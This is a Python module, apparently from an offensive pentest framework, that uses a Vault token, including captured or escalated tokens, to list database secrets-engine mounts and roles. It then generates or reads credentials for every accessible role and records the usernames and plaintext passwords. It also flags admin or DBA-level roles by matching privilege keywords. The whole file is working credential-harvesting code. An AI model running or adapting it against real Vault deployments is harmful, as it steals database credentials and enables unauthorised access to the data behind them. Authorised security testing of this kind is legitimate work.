from typing import Optional

import requests

from ..context import ExecutionContext
from ..registry import BaseExecutionModule, ExecutionResult, RiskLevel


TIMEOUT = 10

# Role creation_statements içinde yüksek yetki belirten terimler
_HIGH_PRIVILEGE_TERMS = (
    "grant all",
    "all privileges",
    " superuser",
    " createdb",
    " createrole",
    "dba ",
    " dba",
    "dbadmin",
    "db_owner",
    "sysadmin",
    "sa ",
    " sa",
)


class DatabaseCredentialHarvestModule(BaseExecutionModule):
    def __init__(self):
        super().__init__(
            module_id="database_credential_harvest.dynamic_creds",
            title="Database Credential Harvest via Vault Secrets Engine",
            risk_level=RiskLevel.STATE_CHANGING,
            description=(
                "Discovers active database secrets engine mounts, lists dynamic and static "
                "roles, and generates or retrieves credentials for each accessible role. "
                "Flags credentials belonging to high-privilege roles (admin/dba level) "
                "based on Vault role creation statements and role name heuristics."
            ),
            default_enabled=False,
        )

    def can_run(self, context: ExecutionContext) -> bool:
        return bool(
            getattr(context, "vault_addr", None)
            and _active_token(context)
        )

    def execute(self, context: ExecutionContext, params: Optional[dict] = None) -> ExecutionResult:
        if not self.can_run(context):
            return ExecutionResult(
                status="skipped",
                message="Database credential harvest requires vault_addr and a valid token.",
                evidence={"missing": _missing_fields(context)},
            )

        params = params or {}
        token = _active_token(context, params)
        base_url = context.vault_addr.rstrip("/")
        timeout = params.get("timeout", TIMEOUT)
        verify_tls = params.get("verify_tls", getattr(context, "verify_tls", True))
        namespace = params.get("namespace", getattr(context, "namespace", None))
        mount_filter: Optional[str] = params.get("mount_path")

        headers = {"X-Vault-Token": token, "Content-Type": "application/json"}
        if namespace:
            headers["X-Vault-Namespace"] = namespace

        try:
            db_mounts = _discover_db_mounts(base_url, headers, timeout, verify_tls)

            # mount_path parametresi verilmişse yalnızca o mount'u tara
            if mount_filter:
                normalized = mount_filter.strip("/") + "/"
                db_mounts = {k: v for k, v in db_mounts.items() if k == normalized}

            if not db_mounts:
                return ExecutionResult(
                    status="failed",
                    message=(
                        "No database secrets engine mounts found or accessible "
                        "with the provided token."
                    ),
                    evidence={"db_mounts": [], "mount_filter": mount_filter},
                )

            harvested: list[dict] = []
            errors: list[dict] = []

            for mount_path in db_mounts:
                _harvest_mount(
                    base_url, headers, timeout, verify_tls,
                    mount_path.strip("/"), harvested, errors,
                )

            if not harvested:
                return ExecutionResult(
                    status="failed",
                    message=(
                        "Database secrets engine mounts found but no credentials "
                        "could be generated or retrieved."
                    ),
                    evidence={
                        "db_mounts": list(db_mounts),
                        "errors": errors[:20],
                    },
                )

            high_priv = [c for c in harvested if c.get("high_privilege")]
            severity = "CRITICAL" if high_priv else "HIGH"

            evidence = {
                "db_mounts": list(db_mounts),
                "total_harvested": len(harvested),
                "high_privilege_count": len(high_priv),
                "credentials": harvested,
                "errors": errors[:20],
            }

            context.add_finding(
                title=f"{severity}: Database Credentials Harvested via Vault Secrets Engine",
                description=(
                    f"Generated or retrieved {len(harvested)} database credential set(s) "
                    f"across {len(db_mounts)} mount(s). "
                    + (
                        f"{len(high_priv)} credential set(s) are associated with "
                        "high-privilege roles (admin/dba level)."
                        if high_priv
                        else "No high-privilege indicators detected in role creation statements."
                    )
                ),
                severity=severity,
                evidence=evidence,
            )

            return ExecutionResult(
                status="success",
                message=(
                    f"Harvested {len(harvested)} credential set(s); "
                    f"{len(high_priv)} flagged as high-privilege."
                ),
                evidence=evidence,
            )

        except requests.RequestException as exc:
            return ExecutionResult(
                status="error",
                message=f"Network error during database credential harvest: {exc}",
                evidence={"error": str(exc)},
            )
        except ValueError as exc:
            return ExecutionResult(
                status="error",
                message=f"Invalid Vault response during database credential harvest: {exc}",
                evidence={"error": str(exc)},
            )


# ─── Mount discovery ──────────────────────────────────────────────────────────

def _discover_db_mounts(base_url, headers, timeout, verify_tls):
    response = requests.get(
        f"{base_url}/v1/sys/mounts",
        headers=headers,
        timeout=timeout,
        verify=verify_tls,
    )
    if response.status_code != 200:
        return {}
    data = _safe_json(response).get("data", {})
    return {
        path: info
        for path, info in data.items()
        if isinstance(info, dict) and info.get("type") == "database"
    }


# ─── Per-mount harvesting ─────────────────────────────────────────────────────

def _harvest_mount(base_url, headers, timeout, verify_tls, mount, harvested, errors):
    dynamic_roles = _list_path(base_url, headers, timeout, verify_tls, f"/v1/{mount}/roles")
    static_roles = _list_path(base_url, headers, timeout, verify_tls, f"/v1/{mount}/static-roles")

    for role in dynamic_roles:
        _generate_dynamic_creds(
            base_url, headers, timeout, verify_tls, mount, role, harvested, errors,
        )

    for role in static_roles:
        _fetch_static_creds(
            base_url, headers, timeout, verify_tls, mount, role, harvested, errors,
        )


# ─── Dynamic credential generation ───────────────────────────────────────────

def _generate_dynamic_creds(base_url, headers, timeout, verify_tls, mount, role, harvested, errors):
    creation_stmts = _role_creation_statements(base_url, headers, timeout, verify_tls, mount, role)

    response = requests.get(
        f"{base_url}/v1/{mount}/creds/{role}",
        headers=headers,
        timeout=timeout,
        verify=verify_tls,
    )
    if response.status_code != 200:
        errors.append({
            "mount": mount,
            "role": role,
            "type": "dynamic",
            "status_code": response.status_code,
        })
        return

    body = _safe_json(response)
    cred_data = body.get("data", {})
    username = cred_data.get("username")
    password = cred_data.get("password")

    if not username:
        errors.append({
            "mount": mount,
            "role": role,
            "type": "dynamic",
            "error": "no username in response",
        })
        return

    print(f"[*] [ACTIVE] DB credential generated: mount={mount} role={role} user={username}")
    harvested.append({
        "mount": mount,
        "role": role,
        "type": "dynamic",
        "username": username,
        "password": password,
        "lease_id": body.get("lease_id", ""),
        "lease_duration_seconds": body.get("lease_duration", 0),
        "high_privilege": _is_high_privilege(creation_stmts, role),
        "creation_statements_preview": creation_stmts[:300] if creation_stmts else None,
    })


def _role_creation_statements(base_url, headers, timeout, verify_tls, mount, role):
    role_meta = _get_json(base_url, headers, timeout, verify_tls, f"/v1/{mount}/roles/{role}")
    if not role_meta:
        return ""
    stmts = role_meta.get("data", {}).get("creation_statements") or []
    if isinstance(stmts, list):
        return " ".join(str(s) for s in stmts)
    return str(stmts)


# ─── Static credential retrieval ─────────────────────────────────────────────

def _fetch_static_creds(base_url, headers, timeout, verify_tls, mount, role, harvested, errors):
    response = requests.get(
        f"{base_url}/v1/{mount}/static-creds/{role}",
        headers=headers,
        timeout=timeout,
        verify=verify_tls,
    )
    if response.status_code != 200:
        errors.append({
            "mount": mount,
            "role": role,
            "type": "static",
            "status_code": response.status_code,
        })
        return

    cred_data = _safe_json(response).get("data", {})
    username = cred_data.get("username")
    password = cred_data.get("password")

    if not username:
        errors.append({
            "mount": mount,
            "role": role,
            "type": "static",
            "error": "no username in response",
        })
        return

    print(f"[*] [ACTIVE] Static DB credential retrieved: mount={mount} role={role} user={username}")
    harvested.append({
        "mount": mount,
        "role": role,
        "type": "static",
        "username": username,
        "password": password,
        "ttl_remaining_seconds": cred_data.get("ttl", 0),
        "high_privilege": _is_high_privilege("", role),
        "creation_statements_preview": None,
    })


# ─── Helpers ──────────────────────────────────────────────────────────────────

def _is_high_privilege(creation_stmts: str, role_name: str) -> bool:
    combined = (creation_stmts + " " + role_name).lower()
    return any(term in combined for term in _HIGH_PRIVILEGE_TERMS)


def _list_path(base_url, headers, timeout, verify_tls, path):
    response = requests.request(
        "LIST",
        f"{base_url}{path}",
        headers=headers,
        timeout=timeout,
        verify=verify_tls,
    )
    if response.status_code == 405:
        response = requests.get(
            f"{base_url}{path}?list=true",
            headers=headers,
            timeout=timeout,
            verify=verify_tls,
        )
    if response.status_code != 200:
        return []
    return [str(k) for k in (_safe_json(response).get("data", {}).get("keys") or [])]


def _get_json(base_url, headers, timeout, verify_tls, path):
    response = requests.get(
        f"{base_url}{path}",
        headers=headers,
        timeout=timeout,
        verify=verify_tls,
    )
    if response.status_code != 200:
        return None
    return _safe_json(response)


def _safe_json(response):
    try:
        data = response.json()
    except ValueError as exc:
        raise ValueError(f"invalid json response: {response.text[:200]}") from exc
    return data if isinstance(data, dict) else {}


def _active_token(context, params: Optional[dict] = None):
    if params:
        explicit = params.get("token")
        if explicit:
            return explicit
    return (
        getattr(context, "captured_token", None)
        or getattr(context, "escalated_token", None)
        or getattr(context, "token", None)
    )


def _missing_fields(context):
    missing = []
    if not getattr(context, "vault_addr", None):
        missing.append("vault_addr")
    if not _active_token(context):
        missing.append("token or captured_token")
    return missing
